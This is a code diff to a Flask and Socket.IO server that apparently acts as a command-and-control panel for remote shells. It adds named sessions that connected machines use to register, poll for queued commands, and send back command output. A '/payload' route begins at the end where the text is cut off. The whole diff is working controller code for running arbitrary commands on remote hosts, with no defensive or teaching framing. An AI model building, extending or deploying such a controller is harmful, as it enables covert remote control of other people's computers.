@@ -4,37 +4,71 @@ from flask_socketio import *
 app = Flask(__name__)
 socketio = SocketIO(app)
 
-cmd_queque = []
+class Shell:
+    cmd_queque = []
+    output = ""
+
+shells = {"__server_log__": Shell()}
+
+def server_log(msg):
+    global shells
+    msg += "\n"
+    socketio.emit("output", (msg, "__server_log__"), broadcast=True)
+    shells["__server_log__"].output += msg.replace("\\","\\\\")
+    print(msg)
 
 @socketio.on('command')
-def handle_command(msg):
-    print('received command: ' + msg)
-    cmd_queque.append(msg)
+def handle_command(msg, shell_name):
+    global shells
+    if shell_name in shells:
+        server_log('[' + shell_name + '] received command: ' + msg)
+        shells[shell_name].cmd_queque.append(msg)
 
 @socketio.on('close')
-def handle_close():
-    global cmd_queque
-    cmd_queque = ["exit"]
-    print('current shell aborted')
+def handle_close(shell_name):
+    global shells
+    if shells.pop(shell_name, None) != None:
+        server_log('[' + shell_name + '] deleted from server')
 
 @app.route('/')
 def index_page():
-    return render_template("main.html")
+    return render_template("main.html", shells=shells)
+
+@app.route('/init')
+def init_page():
+    global shells
+    shell_name = request.args.get("name", "")
+    if shell_name == "":
+        return ""
+    server_log('[' + shell_name + '] connected')
+    shells[shell_name] = Shell()
+    socketio.emit("connected", shell_name, broadcast=True)
+    return "OK"
 
 @app.route('/cmd')
 def cmd_page():
-    if len(cmd_queque) == 0:
+    global shells
+    shell_name = request.args.get("name", "")
+    if shell_name == "":
         return ""
-    cmd = cmd_queque.pop(0)
-    print('sended command: ' + cmd)
-    socketio.emit("output", cmd + "\n", broadcast=True)
+    if not shell_name in shells:
+        server_log('[' + shell_name + '] aborted')
+        return "__exit__"
+    if len(shells[shell_name].cmd_queque) == 0:
+        return ""
+    cmd = shells[shell_name].cmd_queque.pop(0)
+    server_log('[' + shell_name + '] sended command: ' + cmd)
+    shells[shell_name].output += cmd.replace("\\","\\\\") + "\n"
+    socketio.emit("output", (cmd + "\n", shell_name), broadcast=True)
     return cmd
 
 @app.route('/result', methods=['POST'])
 def result_page():
     msg = request.form['output']
-    print('command output: ' + msg)
-    socketio.emit("output", msg, broadcast=True)
+    shell_name = request.form['name']
+    server_log('[' + shell_name + '] command output: ' + msg)
+    shells[shell_name].output += msg.replace("\\","\\\\")
+    socketio.emit("output", (msg, shell_name), broadcast=True)
     return "OK"
 
 @app.route('/payload')
